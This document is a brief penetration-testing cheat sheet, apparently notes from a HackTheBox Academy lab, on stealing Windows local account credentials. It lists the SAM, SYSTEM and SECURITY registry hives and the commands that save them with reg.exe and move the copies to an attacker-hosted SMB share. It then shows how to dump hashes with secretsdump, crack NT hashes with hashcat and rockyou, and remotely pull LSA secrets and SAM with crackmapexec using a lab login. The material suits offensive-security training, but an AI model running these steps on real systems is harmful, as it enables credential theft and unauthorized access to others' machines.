# Attacking SAM

***

## Copying SAM registry hives

| Registry Hive | Description                                                                                                                             |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| hklm\sam      | Contains the hashes associated with local account passwords. We will need the hashes to crack them and get user passwords in cleartext. |
| hklm\system   | Contains the system bootkey, used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                    |
| hklm\security | Contains cached credentials for domain accounts. Beneficial on a domain-joined Windows target.                                          |

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
```

### Create smbserver

```bash
sudo smbserver -smb2support CompData /home/kali/Documents/
```

### Move Hive copies to share

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
```

## Dump Hashes

Dumping local SAM hashes (uid:rid:lmhash:nthash)

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## Crack Hashes

NT hashes

```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## Remote Dumping & LSA Secrets

### LSA Secrets

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### SAM

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
